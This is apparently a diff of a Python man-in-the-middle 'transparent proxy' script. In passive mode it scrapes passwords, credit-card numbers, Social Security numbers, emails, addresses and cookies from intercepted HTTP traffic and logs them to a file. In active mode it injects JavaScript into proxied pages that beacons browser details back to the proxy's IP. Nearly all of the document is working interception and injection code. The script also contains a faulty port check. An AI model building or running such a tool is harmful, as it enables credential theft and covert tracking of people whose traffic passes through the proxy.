@@ -3,35 +3,35 @@ import re
 import socket
 from urllib.parse import urlparse, parse_qs, unquote
 
-BUFFER_SIZE = 4096  # Size of each chunk for receiving data
-
 def extract_sensitive_info(data):
-    # Regex patterns for identifying sensitive information
+    # Define patterns for various types of sensitive information
     regex_patterns = {
-        "firstname": r"firstname=([a-zA-Z]+)",
-        "lastname": r"lastname=([a-zA-Z]+)",
-        "email": r"(?:email=)([a-zA-Z0-9._%+-]+[@%40][a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
-        "username": r"(?:username)=([a-zA-Z0-9._%+-]+)",
-        "password": r"(?:password|passwd|pwd)=([^&\s]+)",
-        "credit_card": r"(?:credit[-_]?card=)(\d{13,16})",
-        "ssn": r"(?:social[-_]?security=)(\d{3}-\d{2}-\d{4})",
-        "phone": r"(?:phone=)(\d{3}-\d{3}-\d{4})",
-        "address": r"(?:address=)([A-Za-z0-9\s,]+)",
-        "city": r"(?:city=)([A-Za-z\s]+)",
-        "state": r"(?:state=)([A-Z]{2})",
-        "zip": r"(?:zip=)(\d{5})",
-        "cookies": r"(Cookie: )([^\r\n]+)"
+        "firstname": r"firstname=([a-zA-Z]+)",  # First name
+        "lastname": r"lastname=([a-zA-Z]+)",  # Last name
+        "email": r"(?:email=)([a-zA-Z0-9._%+-]+[@%40][a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",  # Email pattern allowing @ or %40
+        "username": r"(?:username)=([a-zA-Z0-9._%+-]+)", # Username Pattern
+        "password": r"(?:password|passwd|pwd)=([^&\s]+)",  # Password pattern
+        "credit_card": r"(?:credit[-_]?card=)(\d{13,16})",  # Credit card pattern
+        "ssn": r"(?:social[-_]?security=)(\d{3}-\d{2}-\d{4})",  # Social Security number pattern
+        "phone": r"(?:phone=)(\d{3}-\d{3}-\d{4})",  # US phone number pattern
+        "address": r"(?:address=)([A-Za-z0-9\s,]+)",  # US address pattern
+        "city": r"(?:city=)([A-Za-z\s]+)",  # City
+        "state": r"(?:state=)([A-Z]{2})",  # State (2-letter abbreviation)
+        "zip": r"(?:zip=)(\d{5})",  # ZIP code
+        "cookies": r"(Cookie: )([^\r\n]+)"  # Captures cookies in HTTP headers
     }
 
     found_data = {}
     for key, pattern in regex_patterns.items():
         matches = re.findall(pattern, data)
         if matches:
-            unquoted_matches = [unquote(match) if not isinstance(match, tuple) else unquote("".join(match)) for match in matches]
+            unquoted_matches = [unquote(match if not isinstance(match, tuple) else ''.join(match)) for match in matches]
             found_data[key] = unquoted_matches
     return found_data
 
+
 def log_passive_info(data):
+    # Continuously log sensitive info to `info1.txt`
     sensitive_info = extract_sensitive_info(data)
     if sensitive_info:
         with open("info1.txt", "a") as log_file:
@@ -39,129 +39,111 @@ def log_passive_info(data):
                 for value in values:
                     log_file.write(f"{key}: {value}\n")
 
-# def log_active_info(data):
-#     parsed_url = urlparse(data)
-#     query_params = parse_qs(parsed_url.query)
-
-#     for key, value in query_params.items():
-#         print(f"Received {key}: {value}")  # Debug line to check received data
-
-#     user_agent = query_params.get('user-agent', ['N/A'])[0]
-#     screen_res = query_params.get('screen', ['N/A'])[0]
-#     language = query_params.get('lang', ['N/A'])[0]
-
-#     if user_agent != 'N/A' or screen_res != 'N/A' or language != 'N/A':
-#         with open("info2.txt", "a") as log_file:
-#             log_file.write(data + "\n")
-#             log_file.write("Extracted Client Information:\n")
-#             log_file.write(f"User-Agent: {user_agent}\n")
-#             log_file.write(f"Screen Resolution: {screen_res}\n")
-#             log_file.write(f"Language: {language}\n")
-#             log_file.write("\n")
-
 def log_active_info(data):
-    parsed_url = urlparse(data)
-    query_params = parse_qs(parsed_url.query)
+    if re.match("GET", data):
+        parsed_url = urlparse(data.split(" ")[1])  # Extract the URL part of the GET request
+        query_params = parse_qs(parsed_url.query)
 
-    with open("info2.txt", "a") as log_file:
-        log_file.write("Extracted Client Information:\n")
+        # Extract User-Agent, Screen Resolution, and Language from the query string
+        user_agent = unquote(query_params.get('user-agent', ['N/A'])[0])
+        screen_res = unquote(query_params.get('screen', ['N/A'])[0])
+        language = unquote(query_params.get('lang', ['N/A'])[0])
 
-        for key, value in query_params.items():
-            if value:
-                # Debug print for console verification
-                print(f"Received {key}: {value}")
-
-                # Log each key-value pair to the file
-                log_file.write(f"{key}: {', '.join(value)}\n")
-
-        user_agent = query_params.get('user-agent', ['N/A'])[0]
-        screen_res = query_params.get('screen', ['N/A'])[0]
-        language = query_params.get('lang', ['N/A'])[0]
-
-        # Write the specific fields if they exist
-        if user_agent != 'N/A' or screen_res != 'N/A' or language != 'N/A':
+        with open("info2.txt", "a") as log_file:
+            log_file.write(f"Extracted Client Information:\n")
             log_file.write(f"User-Agent: {user_agent}\n")
             log_file.write(f"Screen Resolution: {screen_res}\n")
             log_file.write(f"Language: {language}\n")
-            log_file.write("\n")  # Add a newline for readability
-
+            log_file.write("\n")  # Add a newline for better readability
 
 def inject_javascript(response, proxy_ip):
+    print(proxy_ip)
     js_code = f"""
     <script>
         (function() {{
-            try {{
-                var userAgent = navigator.userAgent || 'N/A';
-                var screenRes = window.screen.width + 'x' + window.screen.height || 'N/A';
-                var language = navigator.language || navigator.userLanguage || 'N/A';
-                var img = new Image();
-                img.src = 'http://{proxy_ip}/?user-agent=' + encodeURIComponent(userAgent) +
-                          '&screen=' + encodeURIComponent(screenRes) +
-                          '&lang=' + encodeURIComponent(language);
-            }} catch (e) {{
-                console.error('Error in injected script:', e);
-            }}
+            var img = new Image();
+            img.src = 'http://{proxy_ip}:8080/?user-agent=' + encodeURIComponent(navigator.userAgent) +
+                         '&screen=' + encodeURIComponent(window.screen.width + 'x' + window.screen.height) +
+                         '&lang=' + encodeURIComponent(navigator.language || navigator.userLanguage);
+            document.body.appendChild(img);
         }})();
     </script>
     """
     modified_response = re.sub(r"</body>", js_code + "</body>", response, flags=re.IGNORECASE)
     if "</body>" in response:
+        modified_response = re.sub(r"</body>", js_code + "</body>", response, flags=re.IGNORECASE)
         print("Injected JS code into response.")
     else:
-        print("No </body> tag found, could not inject JS.")
+        # Append JS at the end if </body> tag is not found
+        # modified_response = response + js_code
+        print("No </body> tag found; Couldn't Inject")
     return modified_response
 
-def handle_client(client_socket, mode, proxy_ip):
-    try:
-        request = client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
-        if not request:
-            client_socket.close()
-            return
 
-        host_match = re.search(r"Host: (.+)\r\n", request)
-        if not host_match:
-            print("Host header not found in the request.")
-            client_socket.close()
-            return
-
+def handle_client(client_socket, mode, proxy_ip, port):
+    # Receive client request
+    request = client_socket.recv(4096).decode('utf-8', errors='ignore')
+    print("Received request:", request)  # Add this for debugging
+    
+    # Extract destination from Host header in the request
+    host_match = re.search(r"Host: (.+)\r\n", request)
+    if host_match:
         destination_host = host_match.group(1).strip()
-        print(f"Connecting to: {destination_host}")
+    else:
+        client_socket.close()
+        return  # Exit if there's no valid Host header
 
-        try:
+    # Resolve the destination IP and set port 80 as default for HTTP
+    try:
+        if ":" not in destination_host:
             destination_ip = socket.gethostbyname(destination_host)
             destination_port = 80
-        except socket.gaierror as e:
-            print(f"Failed to resolve host: {destination_host} with error {e}")
-            client_socket.close()
-            return
+        else:
+            destination_host_split = destination_host.split(sep=':')
+            destination_ip = destination_host_split[0]
+            print(destination_host_split[1])
+            if destination_host_split[1] != "8080" or destination_host_split[1] != "80":
+                destination_port = 80
+            else:
+                destination_port = destination_host_split[1]
+            
 
-        if mode == "passive":
-            log_passive_info(request)
-        elif mode == "active":
-            log_active_info(request)
+    except socket.gaierror:
+        client_socket.close()
+        return
+    
+    if mode == "passive":
+        # Log request data (includes headers and URL query parameters)
+        log_passive_info(request)
+    elif mode == "active" and destination_ip == proxy_ip:
+        print("Detected request for proxy itself; logging active information.")
+        log_active_info(request)
 
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # Forward request to the actual destination
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
         server_socket.connect((destination_ip, destination_port))
         server_socket.send(request.encode('utf-8'))
 
+        # Receive and forward response in chunks to handle large responses
         while True:
-            response = server_socket.recv(BUFFER_SIZE)
+            response = server_socket.recv(4096)
             if len(response) == 0:
-                break
+                break  # Exit loop when no more data is received
 
             if mode == "active":
                 response_decoded = response.decode('utf-8', errors='ignore')
                 response_with_js = inject_javascript(response_decoded, proxy_ip)
                 client_socket.send(response_with_js.encode('utf-8'))
             else:
+                # Send the response back to the client exactly as received
                 client_socket.send(response)
-
-    except Exception as e:
-        print(f"Error handling client: {e}")
+    except ConnectionRefusedError:
+        print(f"Connection to {destination_host} ({destination_ip}) refused.")
     finally:
         client_socket.close()
-        if 'server_socket' in locals():
-            server_socket.close()
+        server_socket.close()
+
 
 def start_proxy(ip, port, mode):
     proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -172,12 +154,11 @@ def start_proxy(ip, port, mode):
 
     while True:
         client_socket, addr = proxy_socket.accept()
-        print(f"Accepted connection from {addr}")
-        handle_client(client_socket, mode, ip)
+        handle_client(client_socket, mode, ip, port)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Transparent Proxy for Logging")
-    parser.add_argument("-m", "--mode", choices=["active", "passive"], required=True, help="Mode: active or passive")
+    parser.add_argument("-m", "--mode", choices=["active","passive"], required=True, help="Mode: passive only")
     parser.add_argument("ip", help="Listening IP address")
     parser.add_argument("port", type=int, help="Listening port")
     args = parser.parse_args()
